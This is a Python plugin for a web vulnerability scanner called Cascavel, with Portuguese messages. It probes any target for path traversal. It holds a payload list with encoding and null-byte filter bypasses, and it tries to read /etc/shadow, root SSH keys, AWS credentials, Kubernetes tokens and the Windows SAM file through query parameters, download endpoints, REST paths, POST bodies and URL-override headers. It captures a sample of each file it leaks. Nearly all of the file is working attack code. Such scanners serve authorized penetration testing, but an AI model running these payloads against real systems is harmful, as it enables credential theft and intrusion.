# plugins/path_traversal.py — Cascavel 2026 Intelligence
import urllib.parse

import requests

PARAMS = [
    "file",
    "path",
    "doc",
    "document",
    "page",
    "filename",
    "download",
    "attachment",
    "img",
    "image",
    "template",
    "include",
    "report",
    "asset",
    "resource",
    "view",
    "folder",
    "dir",
    "load",
    "export",
]

LINUX_INDICATOR = "root:"

# ──────────── TRAVERSAL PAYLOADS ────────────
TRAVERSAL_PAYLOADS = [
    # Classic depth variations
    ("../../../etc/passwd", LINUX_INDICATOR, "BASIC"),
    ("../../../../etc/passwd", LINUX_INDICATOR, "DEPTH_4"),
    ("../../../../../etc/passwd", LINUX_INDICATOR, "DEPTH_5"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]", "WINDOWS"),
    # Filter bypass encoding
    ("....//....//....//etc/passwd", LINUX_INDICATOR, "DOUBLE_DOT_SLASH"),
    ("..%252f..%252f..%252fetc/passwd", LINUX_INDICATOR, "DOUBLE_ENCODE"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", LINUX_INDICATOR, "URL_ENCODE"),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", LINUX_INDICATOR, "OVERLONG_UTF8"),
    ("%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", LINUX_INDICATOR, "OVERLONG_DOT"),
    ("..%ef%bc%8f..%ef%bc%8fetc/passwd", LINUX_INDICATOR, "FULLWIDTH_SLASH"),
    # Null byte
    ("/..%00/..%00/..%00/etc/passwd", LINUX_INDICATOR, "NULL_BYTE"),
    ("../../../etc/passwd%00.png", LINUX_INDICATOR, "NULL_BYTE_EXT"),
    # Encoded backslash (Windows)
    ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "ENCODED_BACKSLASH"),
    ("....\\\\....\\\\....\\\\windows\\\\win.ini", "[fonts]", "DOUBLE_BACKSLASH"),
    # Absolute + scheme
    ("/etc/passwd", LINUX_INDICATOR, "ABSOLUTE_DIRECT"),
    ("file:///etc/passwd", LINUX_INDICATOR, "FILE_SCHEME"),
    # UNC path (Windows)
    ("\\\\127.0.0.1\\c$\\windows\\win.ini", "[fonts]", "UNC_PATH"),
    # Tab / space bypass
    ("..%09/..%09/etc/passwd", LINUX_INDICATOR, "TAB_BYPASS"),
]

# ──────────── DOWNLOAD ENDPOINT PATTERNS ────────────
DOWNLOAD_ENDPOINTS = [
    "/download?file=",
    "/download?path=",
    "/api/file?path=",
    "/api/download?name=",
    "/api/v1/download?file=",
    "/static/",
    "/assets/",
    "/files/",
    "/docs/",
    "/export?file=",
    "/api/export?path=",
    "/attachment?file=",
    "/api/attachment?name=",
]

# ──────────── SENSITIVE FILES ────────────
SENSITIVE_FILES = [
    ("/etc/shadow", LINUX_INDICATOR, "SHADOW"),
    ("/etc/hosts", "localhost", "HOSTS"),
    ("/proc/self/environ", "PATH=", "PROC_ENVIRON"),
    ("/proc/self/cmdline", "", "PROC_CMDLINE"),
    ("/proc/self/cgroup", "", "PROC_CGROUP"),
    ("/root/.ssh/id_rsa", "BEGIN", "SSH_KEY"),
    ("/root/.bash_history", "", "BASH_HISTORY"),
    ("/root/.aws/credentials", "aws_access_key_id", "AWS_CREDS"),
    ("/var/run/secrets/kubernetes.io/serviceaccount/token", "eyJ", "K8S_TOKEN"),
    ("C:\\boot.ini", "boot", "BOOT_INI"),
    ("C:\\inetpub\\logs\\LogFiles", "", "IIS_LOGS"),
    ("C:\\Windows\\System32\\config\\SAM", "", "SAM_FILE"),
]

# ──────────── ZIP SLIP PATTERNS ────────────
ZIP_SLIP_INDICATORS = ["file uploaded", "extracted", "imported", "success"]


def _test_traversal(target, param, payload, indicator, method):
    """Testa path traversal em um parâmetro."""
    url = f"http://{target}/?{param}={urllib.parse.quote(payload, safe='')}"
    try:
        resp = requests.get(url, timeout=8)
        if resp.status_code == 200 and indicator and indicator in resp.text:
            return {
                "tipo": "PATH_TRAVERSAL",
                "metodo": method,
                "parametro": param,
                "severidade": "CRITICO",
                "descricao": f"Path traversal via {method} — file read confirmado!",
                "amostra": resp.text[:200],
            }
    except Exception:
        pass
    return None


def _test_download_endpoints(target):
    """Testa acesso direto a arquivos via download endpoints."""
    vulns = []
    for filepath, indicator, label in SENSITIVE_FILES:
        for ep in DOWNLOAD_ENDPOINTS:
            url = f"http://{target}{ep}{urllib.parse.quote(filepath, safe='')}"
            try:
                resp = requests.get(url, timeout=6)
                if resp.status_code == 200 and len(resp.text) > 10:
                    if indicator and indicator in resp.text:
                        vulns.append(
                            {
                                "tipo": f"DIRECT_FILE_ACCESS_{label}",
                                "path": filepath,
                                "endpoint": ep,
                                "severidade": "CRITICO",
                                "descricao": f"Arquivo {filepath} acessível via {ep}!",
                            }
                        )
                        break
            except Exception:
                continue
    return vulns


def _test_api_path_traversal(target):
    """Testa path traversal em URLs REST-style."""
    vulns = []
    api_paths = [
        "/api/files/..%2f..%2f..%2fetc%2fpasswd",
        "/api/v1/files/....//....//....//etc/passwd",
        "/api/download/..%252f..%252f..%252fetc/passwd",
        "/static/..%2f..%2f..%2fetc%2fpasswd",
        "/assets/..%c0%af..%c0%afetc/passwd",
        "/images/../../../etc/passwd",
    ]
    for path in api_paths:
        try:
            resp = requests.get(f"http://{target}{path}", timeout=6)
            if LINUX_INDICATOR in resp.text:
                vulns.append(
                    {
                        "tipo": "PATH_TRAVERSAL_API",
                        "path": path[:60],
                        "severidade": "CRITICO",
                        "descricao": "Path traversal via API REST path!",
                    }
                )
                break
        except Exception:
            continue
    return vulns


def _test_zip_slip(target):
    """Testa indicativos de Zip Slip (path traversal via ZIP/TAR upload)."""
    vulns = []
    upload_endpoints = ["/upload", "/api/upload", "/api/v1/upload", "/import", "/api/import"]

    for ep in upload_endpoints:
        url = f"http://{target}{ep}"
        try:
            # Verifica se endpoint aceita uploads
            resp = requests.options(url, timeout=4)
            if resp.status_code in (200, 204, 405):
                # O endpoint existe — reportar como superfície de ataque
                vulns.append(
                    {
                        "tipo": "ZIP_SLIP_SURFACE",
                        "endpoint": ep,
                        "severidade": "MEDIO",
                        "descricao": f"Upload endpoint {ep} detectado — testar Zip Slip manualmente!",
                    }
                )
        except Exception:
            continue
    return vulns


def _test_post_traversal(target, param):
    """Testa path traversal via POST body."""
    for payload, indicator, method in TRAVERSAL_PAYLOADS[:5]:
        try:
            resp = requests.post(f"http://{target}/", data={param: payload}, timeout=6)
            if indicator and indicator in resp.text:
                return {
                    "tipo": "PATH_TRAVERSAL_POST",
                    "metodo": method,
                    "parametro": param,
                    "severidade": "CRITICO",
                }
        except Exception:
            continue
    return None


def _test_header_traversal(target):
    """Testa path traversal via headers (X-Original-URL, X-Rewrite-URL)."""
    override_headers = [
        ("X-Original-URL", "/../../../etc/passwd"),
        ("X-Rewrite-URL", "/../../../etc/passwd"),
        ("X-Override-URL", "/../../../etc/passwd"),
    ]
    for header, value in override_headers:
        try:
            resp = requests.get(f"http://{target}/", headers={header: value}, timeout=6)
            if LINUX_INDICATOR in resp.text:
                return {
                    "tipo": "PATH_TRAVERSAL_HEADER",
                    "header": header,
                    "severidade": "CRITICO",
                    "descricao": f"Path traversal via {header} override!",
                }
        except Exception:
            continue
    return None


def run(target, ip, open_ports, banners):
    """
    Scanner Path Traversal 2026-Grade — GET/POST/API/Header/Download/ZipSlip.

    Técnicas: 18 traversal payloads (classic/encoding/overlong/null byte/UNC/tab),
    12 download endpoints, 12 sensitive files (shadow/SSH key/AWS/K8s/SAM),
    API REST path traversal, Zip Slip surface detection, POST body traversal,
    header override traversal (X-Original-URL/X-Rewrite-URL/X-Override-URL).
    """
    _ = (ip, open_ports, banners)
    vulns = []

    # 1. Parameter-based traversal
    for param in PARAMS:
        for payload, indicator, method in TRAVERSAL_PAYLOADS:
            vuln = _test_traversal(target, param, payload, indicator, method)
            if vuln:
                vulns.append(vuln)
                break

        # POST-based
        vuln = _test_post_traversal(target, param)
        if vuln:
            vulns.append(vuln)

    # 2. Download endpoints
    vulns.extend(_test_download_endpoints(target))

    # 3. API path traversal
    vulns.extend(_test_api_path_traversal(target))

    # 4. Zip Slip surface
    vulns.extend(_test_zip_slip(target))

    # 5. Header override traversal
    header_vuln = _test_header_traversal(target)
    if header_vuln:
        vulns.append(header_vuln)

    return {
        "plugin": "path_traversal",
        "versao": "2026.1",
        "tecnicas": [
            "parameter_traversal",
            "encoding_bypass",
            "download_endpoints",
            "api_path",
            "zip_slip",
            "post_body",
            "header_override",
            "null_byte",
            "unc_path",
            "fullwidth_slash",
        ],
        "resultados": vulns if vulns else "Nenhum path traversal detectado",
    }
